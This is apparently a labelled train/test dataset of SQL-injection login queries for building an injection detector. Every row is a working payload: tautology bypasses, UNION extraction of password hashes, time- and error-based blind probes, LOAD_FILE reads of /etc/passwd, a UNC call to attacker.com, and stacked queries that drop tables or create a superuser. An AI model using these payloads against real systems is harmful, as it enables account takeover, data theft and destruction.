full_query,label,split
"SELECT id, username FROM accounts WHERE username='' OR 1=1 -- ' AND pw='secret123'",1,test
SELECT * FROM accounts WHERE user_name='admin'; SELECT * INTO OUTFILE '/tmp/x' FROM users; -- ' AND password='monkey',1,train
SELECT * FROM users WHERE name='') OR ('1'='1' AND pwd='MySecret123',1,train
select * from users where name='admin'; DELETE FROM users; -- ' and pwd='root_password',1,train
"SELECT id, name FROM members WHERE name='admin' AND LOAD_FILE('\\\\attacker.com\\share') -- ' AND pwd='it''s_a_pass'",1,test
"SELECT id, user_name FROM user_accounts WHERE user_name='D''Angelo' AND pass_hash='admin' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1) -- '",1,train
"SELECT id, email FROM auth_users WHERE email='' OR 1=1 -- ' AND pw='Welcome2024'",1,test
"SELECT * FROM logins WHERE email='' UNION SELECT username,password_hash FROM users -- ' AND hashed_password='$2b$12$S8sCVVk8Fj2JcCWj6SGNiyehMCT2q9J0nud6N8mxV4jG5MJohP5bx'",1,test
"SELECT id, login FROM auth_users WHERE login='admin'--' AND password='Pa$$w0rd!'",1,test
"SELECT id, email FROM customers WHERE email='admin' AND BENCHMARK(1000000,SHA1('a')) -- ' AND pwd='admin123'",1,test
"select * from user_data where email='admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y) -- ' and password='Pa$$w0rd!'",1,test
SELECT * FROM auth_users WHERE login='' --' AND pw='MyPharm@99',1,test
SELECT * FROM user_accounts WHERE name=''; CREATE USER hacker WITH SUPERUSER; -- ' AND password='it''s_a_pass',1,test
SELECT * FROM accounts WHERE name='admin'; SELECT * INTO OUTFILE '/tmp/x' FROM users; -- ' AND pass_hash='pbkdf2:sha256:600000$5ykJ35kN$744cddc739d9ae9144e394f0b1b272526cbfb1213d63c706b20efe8c715973b0',1,test
select * from auth_users where login='' OR 'a'='a' -- ' and hashed_password='320c5abf15493546bbc1a37e04be4c69d8c1204d0272e71231d6bd167d807558',1,test
"SELECT id, login FROM user_data WHERE login='admin' ; DROP TABLE test4; -- ' AND pwd='it''s_a_pass'",1,test
select * from accounts where username='admin' OR 0x61626364=0x61626364 -- ' and password='Welcome2024',1,test
"SELECT id, user_login FROM accounts WHERE user_login='x' UNION SELECT 1,2,3,user(),5,6,7,8,9,10 -- ' AND pwd='MySecret123'",1,test
select * from user_data where email='josip' and pwd='admin' #',1,test
SELECT * FROM user_accounts WHERE login='Alex1818'; UPDATE users SET is_admin=1; -- ' AND password='MySecret123',1,test
SELECT * FROM user_data WHERE user_login='' OR ''='' AND pwd='nicoleivankovic''',1,train
"SELECT * FROM user_data WHERE name='admin' AND SUBSTRING(username,1,1)='a' -- ' AND pw='root_password'",1,test
select * from korisnici where email='info' and password_hash='admin' AND LENGTH(database())>5 -- ',1,test
"select * from auth_users where name='' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables -- ' and pw='secret123'",1,test
SELECT * FROM customers WHERE login='admin'-- -' AND hashed_password='4021cb9eb3694ad048f8397e59d2f2d7e2330866c5e320b2b5ddd40f99ec0529',1,test
"SELECT id, email FROM accounts WHERE email='petra' AND password='admin' AND (SELECT COUNT(*) FROM users)>0 -- '",1,test
"SELECT id, email FROM members WHERE email='admin'; TRUNCATE TABLE logs; -- ' AND pwd='root_password'",1,test
"SELECT * FROM korisnici WHERE login='admin' AND SUBSTRING(username,1,1)='a' -- ' AND pass_hash='55e9dc2e888458b8a2146215b521efacd7d043279a160c2da070ffad4eb6971f'",1,test
"SELECT id, user_login FROM accounts WHERE user_login='admin' OR CHAR(49)=CHAR(49) -- ' AND pass_hash='pbkdf2:sha256:600000$CSFccBZz$c23375cb5e93849284930669c4ae751980b8a9b84199306de0fd1c5a118f10b2'",1,test
"SELECT id, user_name FROM users WHERE user_name='customer1' AND pw='admin' Or '1'='1'",1,train
"SELECT id, user_name FROM user_data WHERE user_name='admin'; INSERT INTO users VALUES(1,'hacker','hash',1); -- ' AND password_hash='179d952394cb072ef962cfbdf81edef9'",1,test
select * from users where name='admin' OR 0x61626364=0x61626364 -- ' and pwd='nicoleivankovic''',1,test
select * from accounts where user_login='' OR 1=1 -- ' and pw='root_password',1,test
select * from auth_users where name='user@gmail.com' and pwd='admin' OR 0x31=0x31 -- ',1,test
"SELECT id, name FROM members WHERE name='admin'/*' AND password='dragon'",1,test
select * from user_accounts where name='user@gmail.com' and pw='admin' AND SLEEP(5) -- ',1,train
"SELECT id, name FROM members WHERE name='admin' UNION SELECT id, username, password_hash, is_admin FROM users -- ' AND pw='secret123'",1,train
select * from user_data where email='' OR 1=1 AND '1'='1' -- ' and pass_hash='c7c78a21b76c52b0cc384071a8769443',1,test
"SELECT * FROM korisnici WHERE user_name='' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL -- ' AND pwd='admin123'",1,test
select * from user_accounts where user_name='admin'; UPDATE users SET is_admin=1 WHERE username='Alex1818'; -- ' and pwd='dragon',1,test
SELECT * FROM accounts WHERE username='' OR '1'='1' AND pw='it''s_a_pass',1,test
SELECT * FROM customers WHERE email='admin'; DELETE FROM users; -- ' AND password='monkey',1,test
"SELECT id, login FROM auth_users WHERE login='admin' AND LENGTH(database())>5 -- ' AND pwd='letmein'",1,test
SELECT * FROM accounts WHERE user_login='admin' OR 0x61626364=0x61626364 -- ' AND password='Pa$$w0rd!',1,test
select * from app_users where login='customer1' and pass_hash='' OR EXISTS(SELECT 1) -- ',1,train
"SELECT id, user_login FROM user_data WHERE user_login='x' UNION SELECT 1,2,3,user(),5,6,7,8,9,10 -- ' AND pw='Welcome2024'",1,test
SELECT * FROM user_accounts WHERE name='josip' AND pw='' OR 1=1#',1,test
select * from user_data where user_name='admin'--' and password_hash='$2b$12$Pn0ziJQjI/xTk8vv/4kBHTZLlDDBh1T9h7oqvasL8lPhQok8VC6ys',1,test
SELECT * FROM korisnici WHERE email='nina' AND pw='admin' OR 1=1/*',1,test
select * from customers where email='admin' Or '1'='1' and pwd='nicoleivankovic''',1,test
select * from members where user_name='admin') --' and password='Spring#2024',1,train
SELECT * FROM logins WHERE name='admin_2024' AND password_hash='admin'/*',1,test
SELECT * FROM logins WHERE user_login='petra' AND hashed_password='' OR 1=1 AND '1'='1' -- ',1,test
"SELECT id, email FROM user_accounts WHERE email='' OR 'x'='x' -- ' AND pw='monkey'",1,test
SELECT * FROM customers WHERE email='' OR 'a'='a' -- ' AND pw='secret123',1,test
"SELECT id, user_login FROM user_accounts WHERE user_login='' UNION SELECT NULL,NULL,NULL -- ' AND hashed_password='$2b$12$2oKs8AF1o0ng4NnEbL0snZaRlDJDGZp9ZmP1AWKbSCTTnlGST7iRO'",1,test
"SELECT id, login FROM logins WHERE login='Alex1818'; DROP TABLE users;-- ' AND pw='qwerty'",1,test
SELECT * FROM user_data WHERE name='admin'; ALTER TABLE users ADD COLUMN backdoor INT; -- ' AND pass_hash='pbkdf2:sha256:600000$s6SLwTCs$d1c156591f2b09cbfa64d8d9dbda11d07aa22dd968d2f03d28e868130275ce47',1,test
"SELECT id, email FROM customers WHERE email='admin'; UPDATE users SET is_admin=1 WHERE username='Alex1818'; -- ' AND pass_hash='431ef614c69583ae6d1d6d5c6b982cd8'",1,train
select * from customers where name='' OR 'a'='a' -- ' and pwd='letmein',1,test
"SELECT * FROM accounts WHERE email='guest' AND password='admin' AND BENCHMARK(1000000,SHA1('a')) -- '",1,test
"SELECT id, email FROM users WHERE email='admin' AND IF(1=1,SLEEP(5),0) -- ' AND hashed_password='pbkdf2:sha256:600000$yhhi8Unc$4a5f72d508903800c55c44782ed1fd5dd2281604b78ef7754395fc0c37fa2432'",1,test
SELECT * FROM user_data WHERE user_login='admin')) --' AND hashed_password='$2b$12$7eQtgnDSMCbbG3H03zM1cKRbv3I/R69sQFpqaliFo3GlTLY.LevEB',1,test
SELECT * FROM user_accounts WHERE user_name='admin'; UPDATE users SET is_admin=1 WHERE id=1; -- ' AND pwd='letmein',1,test
"SELECT id, username FROM customers WHERE username='' UNION SELECT username,password_hash FROM users -- ' AND hashed_password='14e355ff5cd4cdda6b4a87035fcc57ed'",1,test
SELECT * FROM users WHERE user_name='admin' OR 1=1/*' AND password_hash='pbkdf2:sha256:600000$Xvkyp720$5e069ea8d373970b18a118e99f43b543e40a43d293f9b65d6f1c77e3c6e69d91',1,test
SELECT * FROM korisnici WHERE email='admin@company.org' AND pw='' OR ''='',1,test
"select * from accounts where username='user.name' and hashed_password='' UNION SELECT username,password_hash FROM users -- '",1,test
"SELECT id, username FROM app_users WHERE username='admin' OR 0x31=0x31 -- ' AND pw='it''s_a_pass'",1,test
"SELECT id, email FROM user_data WHERE email='admin' AND SUBSTRING(username,1,1)='a' -- ' AND pwd='it''s_a_pass'",1,test
select * from users where user_name='admin'%09OR%09'1'='1' and password='letmein',1,test
select * from auth_users where username='support' and hashed_password='admin'/**/OR/**/'1'='1',1,test
"SELECT id, login FROM customers WHERE login='admin' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) -- ' AND hashed_password='487ebac91a3defcbadbc12b148ff1d8a'",1,train
SELECT * FROM app_users WHERE email='' OR 1=1 -- ' AND pwd='Pa$$w0rd!',1,test
select * from user_accounts where user_name='Alex1818'; DROP TABLE users;-- ' and pwd='Pa$$w0rd!',1,test
"select * from user_data where user_login='admin' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y) -- ' and pwd='Welcome123$'",1,test
select * from auth_users where email='max' and password='admin')) --',1,test
select * from logins where user_login='' OR 'a'='a' -- ' and hashed_password='pbkdf2:sha256:600000$6BinUMED$eba1f6c1613eb4b9f23c4f77ea3b0f5f80d3e8d19e7ec6abaddfe5564b0f888f',1,test
"SELECT id, user_login FROM logins WHERE user_login='admin' AND ASCII(SUBSTRING(@@version,1,1))>52 -- ' AND hashed_password='$2b$12$3I0m3.blLD54k/XUcl9IuCFykxVh1.mw.f/dd.vDpfzhTLw/eyBcr'",1,test
SELECT * FROM logins WHERE name='' OR 1=1#' AND password='monkey',1,test
"SELECT * FROM users WHERE user_login='admin' AND ASCII(SUBSTRING(@@version,1,1))>52 -- ' AND hashed_password='$2b$12$e7bH7BzqLJONuWels4wLxs1im4v3MOD17jaCVf2tdmBtgMHKZQDAv'",1,test
select * from members where login='admin' #' and password_hash='96d4e015fd7cc898b43c2f6d5bb62dc1876dfea99f165cd00957e9912945c346',1,test
SELECT * FROM accounts WHERE login='' OR 1=1#' AND hashed_password='$2b$12$Fe1p1lZBvsOytC7ob/0k4nUhX5L4fgooS0PXjzR0DSZIASU07nPDX',1,test
"SELECT id, login FROM customers WHERE login='user@gmail.com' AND password='admin' OR '1'='1' -- '",1,test
"SELECT id, username FROM user_data WHERE username='jane.smith' AND hashed_password='admin'--'",1,test
select * from logins where login='ad'||'min' OR '1'='1' and password_hash='abf75fb00241b9ed51641762e1f605bfc94b8add77c011346c95908dd889cfb7',1,train
SELECT * FROM user_accounts WHERE user_login='admin'%09OR%09'1'='1' AND hashed_password='8c1d43ab5939725f61ef478f5caaa0b70605c151a026221696179530a0bfb7b5',1,test
"SELECT * FROM members WHERE name='admin' AND IF(1=1,SLEEP(5),0) -- ' AND password='secret123'",1,test
"SELECT id, user_name FROM accounts WHERE user_name='admin'--' AND password='MySecret123'",1,train
"SELECT id, name FROM auth_users WHERE name='admin')) --' AND pwd='MySecret123'",1,test
"SELECT id, login FROM user_accounts WHERE login='admin' AND ASCII(SUBSTRING(@@version,1,1))>52 -- ' AND pass_hash='e29d00c5098b7526e646f2e3a4bbd872b971181b2b2e42b7680bb96862929392'",1,test
SELECT * FROM user_data WHERE login='admin' /* ' AND password='qwerty',1,test
"select * from customers where username='pacijent_001' and password='admin' AND BENCHMARK(1000000,SHA1('a')) -- '",1,train
"select * from users where user_login='admin' AND ASCII(SUBSTRING(@@version,1,1))>52 -- ' and pwd='MySecret123'",1,train
"select * from korisnici where user_login='user' and pass_hash='' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL -- '",1,test
"SELECT id, user_login FROM user_data WHERE user_login='admin' AND pg_sleep(5) -- ' AND hashed_password='b5639b007d8cfe7a8dacd3b184271539'",1,test
"SELECT * FROM users WHERE user_name='admin' AND BENCHMARK(1000000,SHA1('a')) -- ' AND pass_hash='pbkdf2:sha256:600000$E6H05XcP$0bbcef9b08303e38a7ed4e75ea6e9c0bae4f2e74f27c0924938a8c903f3ea7ed'",1,test
"SELECT id, username FROM user_data WHERE username='admin' AND CAST((SELECT user()) AS INT) -- ' AND hashed_password='$2b$12$jaEolyRLA1m8vMGoQxR1c.3Ij8Af65MUPESrmpQA49AhGHDbyIBfT'",1,train
"SELECT id, user_name FROM logins WHERE user_name='admin'; SELECT * INTO OUTFILE '/tmp/x' FROM users; -- ' AND pwd='dragon'",1,test
"SELECT id, email FROM user_data WHERE email='admin' AND 1=2 -- ' AND password_hash='7ae47b8fc0af0836d35956b156d5a237'",1,train
SELECT * FROM users WHERE email='contact' AND password='admin'/*!50000OR*/'1'='1',1,test
"select * from auth_users where email='admin'; INSERT INTO users VALUES(1,'hacker','hash',1); -- ' and pwd='nicoleivankovic'''",1,test
"SELECT id, login FROM auth_users WHERE login='admin' Or '1'='1' AND pw='Welcome2024'",1,test
select * from accounts where username='admin' AND SLEEP(5) -- ' and password_hash='069acccef4b3d35988b2186428711d8aae1060321aa9c7b9529e19b153be119d',1,test
"SELECT * FROM user_accounts WHERE name='admin' OR IF(1=1, SLEEP(5), 0) -- ' AND password_hash='7d689caae783f486e47176c146a56fe2'",1,test
"SELECT id, username FROM user_data WHERE username='admin' OR '1'='1' -- ' AND password='P@ssword2024!'",1,test
SELECT * FROM accounts WHERE user_name='1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ' AND hashed_password='$2b$12$BWJDAyghxqYA2tpXU6e2vlSCi6gHvGbWVYMztRlWdlmuuFcUPnc.s',1,test
"SELECT id, email FROM logins WHERE email='admin' OR 1=1 -- ' AND pwd='password'",1,test
SELECT * FROM user_data WHERE login='' OR 'a'='a' AND pass_hash='$2b$12$IqW4vEuGfUjMz3Y9d9VbScEKNDGZ0wpL/Oq6S8esMRYBo2A0GFRBi',1,test
SELECT * FROM user_data WHERE username='admin'/*' AND pwd='12345678',1,train
"select * from customers where login='admin' OR IF(1=1, SLEEP(1), 0); -- ' and pw='Welcome123$'",1,test
"SELECT id, username FROM accounts WHERE username='admin@company.org' AND password='admin'/*'",1,test
SELECT * FROM users WHERE name='' OR 'a'='a' -- ' AND pwd='MyPharm@99',1,train
SELECT * FROM korisnici WHERE user_name='admin' OR 0x31=0x31 -- ' AND hashed_password='84fa480f7873ef3f86d6d0f39e4cf82e',1,train
SELECT * FROM korisnici WHERE user_login='admin' ; DROP TABLE test1; -- ' AND password_hash='3a8af3870deaf9d06d4535c9de51c7da57832e062d13d809fb86dd3d505a23a3',1,test
SELECT * FROM auth_users WHERE name='' OR '1'='1'-- ' AND pw='Spring#2024',1,train
SELECT * FROM korisnici WHERE username='max' AND hashed_password='') OR ('1'='1',1,train
SELECT * FROM user_accounts WHERE user_name=''; CREATE USER hacker WITH SUPERUSER; -- ' AND pass_hash='096535e7e1971c8e1f26baece774763003d7c0258877d6375c5b8ccb5533e59a',1,test
SELECT * FROM user_data WHERE email='admin'; TRUNCATE TABLE logs; -- ' AND password_hash='pbkdf2:sha256:600000$1evcYXyG$f6a856894968ddd6bdb0fa45e11cb50f2a9e6a728a01d9c1f6677e6fbdedc28a',1,test
"SELECT id, login FROM auth_users WHERE login='' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables -- ' AND pwd='root_password'",1,test
SELECT * FROM users WHERE name='admin' ; DROP TABLE test1; -- ' AND pwd='Pa$$w0rd!',1,test
"select * from customers where user_login='admin' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1) -- ' and pwd='MyPharm@99'",1,test
SELECT * FROM members WHERE username='' --' AND pw='Welcome2024',1,train
select * from user_data where user_name='1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ' and hashed_password='034f0bb1ddc179bb9501216bb5d4de71111de0e815f09c73d813a9b041a50521',1,test
select * from users where login='kristijan' and pass_hash='' OR 'a'='a',1,test
select * from user_data where email='grace' and pwd='admin' AND SLEEP(5) -- ',1,train
select * from logins where login='emma' and pass_hash='admin'%09OR%09'1'='1',1,test
"SELECT id, user_login FROM accounts WHERE user_login='admin'-- -' AND pass_hash='bc3b335f1a94a02b3b41b376aaa92a1fb663039bccce7beb24798d03d2091416'",1,test
SELECT * FROM accounts WHERE login='admin' OR 0x61626364=0x61626364 -- ' AND hashed_password='pbkdf2:sha256:600000$GjPTCFJb$72d95fcb9a6d7f2b9b2cffd5bf6df321d4f65a466bcac51e6e915d9384c42489',1,test
SELECT * FROM members WHERE email='support' AND pwd='admin' OR 0x31=0x31 -- ',1,test
select * from app_users where user_login='' OR EXISTS(SELECT 1) -- ' and pw='Spring#2024',1,test
select * from user_data where user_login='ivana' and hashed_password='admin' ; DROP TABLE test4; -- ',1,test
SELECT * FROM members WHERE username='admin'%09OR%09'1'='1' AND pass_hash='80d5ee1ed84118444f12479f530b9f79',1,test
"SELECT id, email FROM customers WHERE email='emma' AND hashed_password='admin' ; DROP TABLE test4; -- '",1,test
SELECT * FROM korisnici WHERE login='admin'--' AND pw='admin123',1,train
SELECT * FROM korisnici WHERE user_name='' OR 1=1 LIMIT 1 -- ' AND pass_hash='de0900ea640085442c02b56fa159a98a',1,test
"SELECT * FROM app_users WHERE user_name='' UNION SELECT NULL,NULL,NULL,NULL; -- ' AND pwd='Pa$$w0rd!'",1,test
SELECT * FROM logins WHERE login='alice' AND password='' --',1,test
SELECT * FROM customers WHERE name='matija' AND pw='admin' AND (SELECT COUNT(*) FROM users)>0 -- ',1,test
"SELECT id, name FROM user_accounts WHERE name='' UNION SELECT NULL,NULL,NULL,NULL; -- ' AND pw='secret123'",1,train
"SELECT id, username FROM user_data WHERE username='contact' AND password_hash='admin'; DROP TABLE users; -- '",1,test
select * from auth_users where name='charlie' and pwd='admin' ; DROP TABLE test1; -- ',1,test
SELECT * FROM korisnici WHERE username='admin' AND SLEEP(5) -- ' AND password='secret123',1,test
SELECT * FROM korisnici WHERE name='admin' OR 1=1/*' AND hashed_password='pbkdf2:sha256:600000$InNx1hs5$e0cc766890719ef3936f1cbec38565d144afb1f8192ce9bfc1fbd4bf999eb888',1,test
SELECT * FROM customers WHERE user_name='admin' ; DROP TABLE test4; -- ' AND pwd='S3cur3P@ss',1,test
select * from user_accounts where email='support@example.com' and pwd='' OR 'a'='a' -- ',1,train
"select * from customers where login='admin' OR IF(1=1, SLEEP(1), 0); -- ' and pass_hash='pbkdf2:sha256:600000$p227OAbS$bdf15ce73f6a703738045b90c4e095a7966dc773156e387c8c1b874d8d867461'",1,test
select * from korisnici where user_login='Alex1818'; DROP TABLE users;-- ' and pw='secret123',1,test
"select * from user_data where user_name='admin'; INSERT INTO users VALUES(1,'hacker','hash',1); -- ' and hashed_password='d0e2aeaf330308e02b30ac984d3aaaaf9d9e17f92fa12f3922dd59dda9c52898'",1,train
SELECT * FROM accounts WHERE name='' OR 'a'='a' AND password='qwerty',1,test
"SELECT * FROM logins WHERE login='admin' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1) -- ' AND pwd='MySecret123'",1,test
SELECT * FROM korisnici WHERE login='admin'; TRUNCATE TABLE logs; -- ' AND pwd='test''password',1,test
SELECT * FROM korisnici WHERE login='admin'/*!50000OR*/'1'='1' AND hashed_password='pbkdf2:sha256:600000$VvChgRUx$648fb830e96f5dbffcf020919737039269225834d252c8797442d8dcac4260e6',1,test
select * from app_users where name='admin' OR '1'='1' -- ' and hashed_password='pbkdf2:sha256:600000$DBUrimfn$0deff3ea205219b03d311e85a0a904ae572689babe7c706cd266902a6ce046c8',1,test
"select * from korisnici where user_name='admin' AND BENCHMARK(1000000,SHA1('a')) -- ' and hashed_password='pbkdf2:sha256:600000$jlwE7HqX$4cffcbf26f86a74e3c09bb727f970e16f870d03bcce555efe24e112ff4e06dca'",1,test
select * from auth_users where username='sales' and password='Alex1818'; DROP TABLE users;-- ',1,test
"SELECT id, email FROM app_users WHERE email='admin' OR CHAR(49)=CHAR(49) -- ' AND pw='MySecret123'",1,test
SELECT * FROM user_accounts WHERE username='admin'; DELETE FROM users; -- ' AND pass_hash='pbkdf2:sha256:600000$S1LLQA2y$667010b6debb73733ea08a623f8561bfdb634222f0ec0f9565ff941715c27748',1,test
select * from user_data where name='admin' AND 1=2 -- ' and hashed_password='59ee467a1e27ad7df744e6d98d5eb62473312ba42c8247f966a87736a3cba2db',1,test
select * from auth_users where user_name='admin'; UPDATE users SET is_admin=1 WHERE username='Alex1818'; -- ' and hashed_password='097e5561d6a1204f562c9f93639b0bc2',1,test
"SELECT * FROM members WHERE user_name='john' AND hashed_password='' UNION SELECT 1,2,3,4 -- '",1,test
"SELECT * FROM users WHERE user_name='' UNION SELECT NULL,NULL,NULL,NULL; -- ' AND hashed_password='af3676916fd89beecb5c6f9b47dbdb81cadf9cb8b776fcd7cedd8aa3ddd723b1'",1,test
SELECT * FROM auth_users WHERE name='admin' #' AND password_hash='pbkdf2:sha256:600000$xuwZMRsh$b6731266bdf65f98b2b11697fd91a92a11ea6afbc12cb0f728e2d53a63ae0881',1,test
"SELECT * FROM members WHERE user_login='marko' AND pw='admin' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) -- '",1,train
"SELECT id, user_login FROM korisnici WHERE user_login='' OR 'x'='x' -- ' AND hashed_password='$2b$12$WY1oT42.y7Szhz9UFEppScyJhn7Zdm0SBTor4mYr6d/Q2VcgNpaUo'",1,test
select * from user_data where email='M.Smith' and pw='' OR '1'='1',1,train
select * from korisnici where name='admin')) --' and pass_hash='$2b$12$uzQe4jDXyMYiAwRpNEnK2CNB7QTmoT.ZE7BRc2W4CCFXhjzQ5ad9O',1,test
"SELECT id, email FROM members WHERE email='admin' ; DROP TABLE test1; -- ' AND password_hash='pbkdf2:sha256:600000$Vw5jjIPO$700d0cd1ede20a0b7d85a1d6fa0bff6910f7d0a214084b1474ae0b5b5d30cadb'",1,test
select * from members where name='ad'||'min' OR '1'='1' and pw='admin123',1,test
"SELECT id, username FROM user_accounts WHERE username='luka' AND password_hash='') OR ('1'='1'",1,test
"SELECT id, user_name FROM user_data WHERE user_name='ana' AND pw='ad'||'min' OR '1'='1'",1,test
"SELECT id, user_login FROM members WHERE user_login='admin'; INSERT INTO users VALUES(1,'hacker','hash',1); -- ' AND password='secret123'",1,test
"SELECT id, email FROM user_data WHERE email='admin' AND IF(1=1,SLEEP(5),0) -- ' AND pw='Spring#2024'",1,test
select * from users where user_login='admin' Or '1'='1' and pw='monkey',1,test
"select * from auth_users where login='' UNION SELECT 1,2,3,4 -- ' and pass_hash='$2b$12$DVpTySbDvWFTTOMgXO8FQVfJcElDZvZdek9/jGNywfygxGWP8IFeH'",1,test
select * from accounts where login='admin' AND CAST((SELECT user()) AS INT) -- ' and password_hash='pbkdf2:sha256:600000$5ijmeVju$bb5751667de7484c7909ae37e07031d0b5607aba03ab1db517fd85266f3f9ac6',1,test
select * from user_data where login='admin'; WAITFOR DELAY '0:0:5' -- ' and password_hash='$2b$12$YsI/z2CDTzephMzK9Xha9LJ2oES8oOIvPzQVynSZkfC2yxUc6JFgp',1,test
SELECT * FROM users WHERE username='1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- ' AND password_hash='4f43caee51fa7a8483890fb831851bb9',1,train
select * from app_users where name='admin'/*' and pwd='P@ssword2024!',1,test
SELECT * FROM auth_users WHERE login='admin' ; DROP TABLE test1; -- ' AND hashed_password='5d28c22f251a7b1fe3b6ec3f1eee5657febbcd2d747aa97681bdeb70256980c5',1,test
SELECT * FROM users WHERE login='nina' AND pwd='admin'/**/OR/**/'1'='1',1,test
"SELECT id, user_name FROM accounts WHERE user_name='' OR 'a'='a' AND password_hash='780eff5c9129772dd89c20a2b3cff688'",1,test
"SELECT id, email FROM korisnici WHERE email='' OR 1=1 LIMIT 1 -- ' AND pw='secret123'",1,test
select * from customers where username='admin'/*!50000OR*/'1'='1' and password_hash='02ff8a5c148a535195e755e6516fe59e',1,test
"SELECT * FROM logins WHERE email='' UNION SELECT NULL,NULL,NULL -- ' AND pass_hash='pbkdf2:sha256:600000$y9ukqNiN$12ac03a54ffd83a8c35315cbf35fa1c24abe8d9aa55216220a165be347beacce'",1,test
SELECT * FROM auth_users WHERE user_login='admin'; UPDATE users SET is_admin=1 WHERE id=1; -- ' AND pass_hash='$2b$12$RC0MrBvvH0IhVf/g02/rwn5GjC1bf6aovq1pAaGQvsbukMHtwctwk',1,test
"SELECT id, username FROM auth_users WHERE username='admin'%09OR%09'1'='1' AND pwd='secret123'",1,test
"select * from user_accounts where user_login='kristijan' and hashed_password='' UNION SELECT NULL,NULL,NULL -- '",1,test
SELECT * FROM logins WHERE email='info@pharma.hr' AND pass_hash='ad'||'min' OR '1'='1',1,test
"select * from logins where user_name='frank' and hashed_password='' UNION SELECT username,password_hash FROM users -- '",1,test
select * from logins where user_login='' OR 1=1 -- ' and pass_hash='$2b$12$nVoSTQ31Wa.i2qogDNniFxdwQCzxvEkhZKiq8acxWko4h6kXCVOAJ',1,test
"select * from korisnici where name='maja' and pwd='admin' AND IF(1=1,SLEEP(5),0) -- '",1,train
"SELECT id, username FROM app_users WHERE username='admin' Or '1'='1' AND pw='dragon'",1,test
"SELECT id, username FROM users WHERE username='admin' OR IF(1=1, SLEEP(1), 0); -- ' AND password='MySecret123'",1,train
SELECT * FROM user_accounts WHERE name='admin'; UPDATE users SET is_admin=1 WHERE username='Alex1818'; -- ' AND hashed_password='6a4df96883730e55ab57952ed50370fa96b693ee981722e2f9d3237ef07e7481',1,test
SELECT * FROM users WHERE name='support@example.com' AND password='Alex1818'; DROP TABLE users;-- ',1,test
SELECT * FROM logins WHERE user_name='test' AND pw='admin'; ALTER TABLE users ADD COLUMN backdoor INT; -- ',1,test
select * from logins where login='admin' OR 1=1/*' and hashed_password='e7bddb0ee8864cb7f1daf386637573a8',1,test
SELECT * FROM customers WHERE username='' OR 1=1 LIMIT 1 -- ' AND pwd='test''password',1,test
select * from auth_users where user_login='ad'||'min' OR '1'='1' and pw='MyPharm@99',1,test
SELECT * FROM user_accounts WHERE username='' OR 'a'='a' AND password='MyPharm@99',1,test
SELECT * FROM users WHERE username='demo' AND pwd='admin'; DELETE FROM users; -- ',1,test
"SELECT * FROM auth_users WHERE user_name='admin' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1) -- ' AND password_hash='pbkdf2:sha256:600000$ml7WX9Zn$84883df2d683f2aec19fc906148b6ee98a3bd695289f540441026941c946dc7b'",1,test
SELECT * FROM customers WHERE email='admin' OR 0x61626364=0x61626364 -- ' AND password_hash='pbkdf2:sha256:600000$ixSKKtmp$c830201884dc24bbf219a6a67299d383a16c9f9e3b57f3bfc25bf037e96dd3e2',1,test
"SELECT id, user_login FROM app_users WHERE user_login='test' AND pwd='admin' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1) -- '",1,train
select * from user_data where email='' OR 1=1 AND '1'='1' -- ' and pwd='admin123',1,test
"SELECT id, email FROM accounts WHERE email='admin')) --' AND password='12345678'",1,train
"SELECT id, login FROM user_data WHERE login='admin'--' AND password='monkey'",1,test
select * from users where login='john' and pw='admin'; ALTER TABLE users ADD COLUMN backdoor INT; -- ',1,test
